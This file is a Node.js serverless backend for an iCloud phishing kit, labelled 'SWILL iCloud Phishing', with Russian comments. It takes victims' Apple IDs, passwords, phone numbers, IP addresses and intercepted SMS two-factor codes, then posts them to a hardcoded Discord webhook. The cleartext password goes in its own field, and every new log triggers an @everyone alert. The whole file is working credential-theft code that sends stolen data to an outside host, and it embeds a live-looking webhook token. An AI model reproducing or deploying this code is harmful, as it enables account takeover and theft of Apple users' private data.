const fetch = require('node-fetch');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1483182140492611625/7JNKtGxkQlQBehia2Aqtx_SbTflKd-oGtsr0eB70DBJ1ySc10F22JlYiWtpn8tDhmOXv';

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;
    
    // Форматируем сообщение для Discord
    const embed = {
        title: '📱 НОВЫЙ ПЕРЕХВАТ ICLOUD',
        color: 0x5865F2,
        fields: [
            {
                name: '🍏 Apple ID',
                value: data.appleId || 'Не указан',
                inline: true
            },
            {
                name: '🔑 Пароль',
                value: data.password ? '██████' : 'Не указан',
                inline: true
            },
            {
                name: '📞 Телефон',
                value: data.phone || 'Не указан',
                inline: true
            },
            {
                name: '🌐 IP-адрес',
                value: data.ip || 'Не определен',
                inline: true
            },
            {
                name: '🕒 Время',
                value: new Date().toLocaleString('ru-RU'),
                inline: true
            },
            {
                name: '🔄 Попытка',
                value: `#${data.attempt || 1}`,
                inline: true
            },
            {
                name: '📱 User-Agent',
                value: (data.userAgent || 'Не определен').substring(0, 100),
                inline: false
            },
            {
                name: '🔒 Полные данные',
                value: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
                inline: false
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: 'SWILL iCloud Phishing • Автоматический перехват',
            icon_url: 'https://www.apple.com/favicon.ico'
        }
    };

    // Добавляем поле с паролем в открытом виде (только если есть)
    if (data.password) {
        embed.fields.push({
            name: '⚠️ ПАРОЛЬ (ОТКРЫТЫЙ)',
            value: `||${data.password}||`,
            inline: false
        });
    }

    try {
        // Отправляем в Discord
        const discordResponse = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                content: '@everyone **НОВЫЙ ЛОГ ICLOUD!**'
            })
        });

        // Дополнительная отправка SMS-кодов если есть
        if (data.smsCode) {
            const smsEmbed = {
                title: '📨 SMS-КОД ПЕРЕХВАЧЕН',
                color: 0x00FF00,
                fields: [
                    { name: 'Код подтверждения', value: data.smsCode, inline: true },
                    { name: 'Apple ID', value: data.appleId, inline: true }
                ],
                timestamp: new Date().toISOString()
            };
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [smsEmbed] })
            });
        }

        res.status(200).json({ 
            success: true, 
            message: 'Data sent to Discord',
            discordResponse: await discordResponse.json()
        });
    } catch (error) {
        console.error('Discord webhook error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
};
